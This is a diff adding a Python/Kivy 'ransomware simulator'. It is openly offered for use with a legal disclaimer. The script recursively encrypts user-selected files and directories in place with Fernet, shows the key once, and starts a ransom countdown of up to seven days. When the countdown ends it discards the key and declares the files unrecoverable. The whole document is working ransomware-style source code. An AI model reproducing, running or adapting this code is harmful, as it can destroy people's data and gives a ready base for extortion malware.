@@ -1,0 +1,221 @@
+#Ransomware Simulator by Viajatech 
+
+#Eres responsable del uso de este script si deseas usarlo y de las consecuencias legales que puede conllevar.
+#Version Kivy GUI [C] 
+#Incluye temporazidor de rescate de 10 minutos y botón payransom 
+
+#Por David Ruiz
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales @viajatech
+#Se agredecido y dale estrella a este repositorio, gracias! 
+
+#pip install cryptography tk
+#pip install kivy cryptography plyer
+
+
+import os
+import base64
+import time
+import threading
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.popup import Popup
+from kivy.uix.textinput import TextInput
+from kivy.uix.togglebutton import ToggleButton
+from kivy.clock import Clock
+from kivy.core.clipboard import Clipboard
+from cryptography.fernet import Fernet
+from tkinter import filedialog, Tk
+
+class RansomwareSimulatorByViajaTech(App):
+    def build(self):
+        self.title = "Ransomware Simulator by Viaja Tech"  
+        self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
+        self.files_to_encrypt = []
+        self.rescue_time_left = 600  # 10 minutes for rescue timer
+        self.timer_running = False
+
+        self.root = BoxLayout(orientation='vertical', padding=10, spacing=10)
+
+        self.select_button = Button(text="Select Files/Directories", size_hint=(1, 0.1))
+        self.select_button.bind(on_press=self.select_files_directories)
+        self.root.add_widget(self.select_button)
+
+        self.encrypt_button = Button(text="Encrypt Files", size_hint=(1, 0.1))
+        self.encrypt_button.bind(on_press=self.encrypt_files)
+        self.root.add_widget(self.encrypt_button)
+
+        self.decrypt_button = Button(text="Decrypt Files", size_hint=(1, 0.1))
+        self.decrypt_button.bind(on_press=self.decrypt_files)
+        self.root.add_widget(self.decrypt_button)
+
+        self.set_timer_button = Button(text="Set Rescue Timer", size_hint=(1, 0.1))
+        self.set_timer_button.bind(on_press=self.set_rescue_timer)
+        self.root.add_widget(self.set_timer_button)
+
+        self.status_label = Label(text="Status: Ready", size_hint=(1, 0.1))
+        self.root.add_widget(self.status_label)
+
+        self.timer_label = Label(text="Time left to rescue: N/A", size_hint=(1, 0.1))
+        self.root.add_widget(self.timer_label)
+
+        return self.root
+
+    def select_files_directories(self, instance):
+        Tk().withdraw()
+        
+        # Select files
+        selected_files = filedialog.askopenfilenames(title="Select Files")
+        self.files_to_encrypt.extend(selected_files)
+        
+        # Select directories
+        selected_directory = filedialog.askdirectory(title="Select Directory")
+        if selected_directory:
+            for root, _, files in os.walk(selected_directory):
+                for file in files:
+                    self.files_to_encrypt.append(os.path.join(root, file))
+        
+        self.status_label.text = f"Selected {len(self.files_to_encrypt)} files"
+
+    def encrypt_files(self, instance):
+        if not self.files_to_encrypt:
+            self.status_label.text = "No files selected for encryption."
+            return
+
+        threads = []
+        for file_path in self.files_to_encrypt:
+            thread = threading.Thread(target=self.encrypt_file, args=(file_path,))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+        self.status_label.text = "Status: Files Encrypted"
+        self.show_key_dialog(base64.urlsafe_b64encode(self.key).decode())
+        self.start_rescue_timer()
+
+    def encrypt_file(self, file_path):
+        try:
+            with open(file_path, 'rb') as file:
+                original_data = file.read()
+            encrypted_data = self.fernet.encrypt(original_data)
+            with open(file_path, 'wb') as file:
+                file.write(encrypted_data)
+        except Exception as e:
+            self.status_label.text = f"Error: {str(e)}"
+
+    def show_key_dialog(self, key):
+        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
+        content.add_widget(Label(text="Files have been encrypted. Decryption key:"))
+        key_text = TextInput(text=key, readonly=True, multiline=False)
+        content.add_widget(key_text)
+        copy_button = Button(text="Copy to Clipboard")
+        copy_button.bind(on_press=lambda x: Clipboard.copy(key))
+        content.add_widget(copy_button)
+        popup = Popup(title='Encryption Key', content=content, size_hint=(0.8, 0.5))
+        popup.open()
+
+    def decrypt_files(self, instance):
+        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
+        content.add_widget(Label(text="Enter the decryption key:"))
+        key_input = TextInput(multiline=False)
+        content.add_widget(key_input)
+        submit_button = Button(text="Submit")
+        content.add_widget(submit_button)
+        popup = Popup(title='Enter Decryption Key', content=content, size_hint=(0.8, 0.5))
+        submit_button.bind(on_press=lambda x: self.submit_key(key_input.text, popup))
+        popup.open()
+
+    def submit_key(self, key_str, popup):
+        if key_str:
+            try:
+                key = base64.urlsafe_b64decode(key_str)
+                fernet = Fernet(key)
+                threads = []
+                for file_path in self.files_to_encrypt:
+                    thread = threading.Thread(target=self.decrypt_file, args=(file_path, fernet))
+                    thread.start()
+                    threads.append(thread)
+
+                for thread in threads:
+                    thread.join()
+
+                self.status_label.text = "Status: Files Decrypted"
+                popup.dismiss()
+            except Exception as e:
+                self.status_label.text = f"Error: {str(e)}"
+
+    def decrypt_file(self, file_path, fernet):
+        try:
+            with open(file_path, 'rb') as file:
+                encrypted_data = file.read()
+            decrypted_data = fernet.decrypt(encrypted_data)
+            with open(file_path, 'wb') as file:
+                file.write(decrypted_data)
+        except Exception as e:
+            self.status_label.text = f"Error: {str(e)}"
+
+    def set_rescue_timer(self, instance):
+        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
+        content.add_widget(Label(text="Select or Enter Rescue Time:"))
+
+        self.time_var = 600  # Default to 10 minutes
+        predefined_times = [("10 Minutes", 600), ("1 Hour", 3600), ("24 Hours", 86400), ("7 Days", 604800)]
+        
+        for label, value in predefined_times:
+            tb = ToggleButton(text=label, group='time')
+            tb.bind(on_release=lambda x, val=value: self.set_time(val))
+            content.add_widget(tb)
+
+        custom_time_input = TextInput(hint_text="Custom (minutes):", multiline=False)
+        content.add_widget(custom_time_input)
+
+        set_custom_time_button = Button(text="Set Custom Time")
+        set_custom_time_button.bind(on_press=lambda x: self.set_custom_time(custom_time_input.text))
+        content.add_widget(set_custom_time_button)
+
+        ok_button = Button(text="OK")
+        ok_button.bind(on_press=lambda x: self.confirm_time_selection(popup))
+        content.add_widget(ok_button)
+
+        popup = Popup(title='Set Rescue Timer', content=content, size_hint=(0.9, 0.9))
+        popup.open()
+
+    def set_time(self, value):
+        self.time_var = value
+
+    def set_custom_time(self, custom_time):
+        try:
+            custom_time = int(custom_time) * 60
+            self.time_var = custom_time
+        except ValueError:
+            self.status_label.text = "Error: Invalid time input."
+
+    def confirm_time_selection(self, popup):
+        self.rescue_time_left = self.time_var
+        self.status_label.text = f"Rescue timer set to {self.rescue_time_left // 60} minutes."
+        popup.dismiss()
+        self.start_rescue_timer()
+
+    def start_rescue_timer(self):
+        self.timer_running = True
+        self.update_timer()
+
+    def update_timer(self, *args):
+        if self.rescue_time_left > 0 and self.timer_running:
+            mins, secs = divmod(self.rescue_time_left, 60)
+            timeformat = f"{mins:02d}:{secs:02d}"
+            self.timer_label.text = f"Time left to rescue: {timeformat}"
+            self.rescue_time_left -= 1
+            Clock.schedule_once(self.update_timer, 1)
+        else:
+            self.timer_label.text = "Time left to rescue: 00:00"
+            self.status_label.text = "Time Over! Files cannot be decrypted."
+            self.timer_running = False
+            self.key = None
+
+if __name__ == "__main__":
+    RansomwareSimulatorByViajaTech().run()
